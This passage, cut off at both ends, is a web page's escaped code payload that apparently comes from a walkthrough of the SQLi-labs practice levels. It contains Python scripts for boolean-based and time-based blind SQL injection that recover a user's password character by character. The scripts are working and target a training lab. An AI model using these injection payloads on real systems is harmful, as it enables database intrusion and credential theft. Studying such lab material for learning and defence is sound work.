punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e resp\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003equery_post\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e**\u003c/span\u003ekwargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    url \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e base_url \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epath\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e/\"\u003c/span\u003e\u003c/span\u003e\n    resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e requests\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003epost\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eurl\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e**\u003c/span\u003ekwargs\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e resp\n"])</script><script>self.__next_f.push([1,"18:T48a,\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Yes\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"No\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- Yes\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e11\u003c/span\u003e\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\u003cspan class=\"token number\"\u003e45\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003esleep\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- 4\u003c/span\u003e\n19:T11f8,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e query \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e# target: SELECT password FROM security.users WHERE username='Angelina'\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-5\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=0 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 720\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-5\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=1 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 704\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- \"\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-5\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e704\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n\n\npassword \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    ch \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e brute_force\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epassword\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e ch \u003cspan class=\"token keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"[*] found\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token builtin\"\u003echr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    password \u003cspan class=\"token operator\"\u003e+=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003echr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ech\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epassword\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# I-kill-you\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1a:Tb6e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-6\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'?id=1\" AND 1=0 -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 720\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-6\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e'?id=1\" AND 1=1 -- '\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 702\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef'?id=1\" AND ascii(substr((SELECT password FROM security.users WHERE username=\"Angelina\"),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- '\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-6\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e702\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1b:Tbe7,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003efont\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ecolor\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e#FFFF00\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eYou have an error in your SQL syntax\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003efont\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003efont\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ediv\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ecenter\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003efont\u003c/span\u003e \u003cspan class=\"token attr-name\"\u003ecolor\u003c/span\u003e\u003cspan class=\"token attr-value\"\u003e\u003cspan class=\"token punctuation attr-equals\"\u003e=\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e#FFFF00\u003cspan class=\"token punctuation\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003eYou are in.... Use outfile......\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003efont\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003efont\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ediv\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;/\u003c/span\u003ebr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token tag\"\u003e\u003cspan class=\"token punctuation\"\u003e\u0026lt;\u003c/span\u003ecenter\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1c:Tac7,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"You are in\"\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-7\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1')) AND 1=0 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# False\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"You are in\"\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-7\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1')) AND 1=1 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- \"\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-7\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"You are in\"\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e resp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1d:Tb6e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-8\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=0 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 722\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-8\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=1' AND 1=1 -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# 706\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003ebrute_force\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"token builtin\"\u003erange\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e32\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e127\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003epos\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e,1))=\u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e -- \"\u003c/span\u003e\u003c/span\u003e\n        resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-8\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token number\"\u003e706\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e i\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eNone\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"1e:Tb6e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003elen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003equery_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan 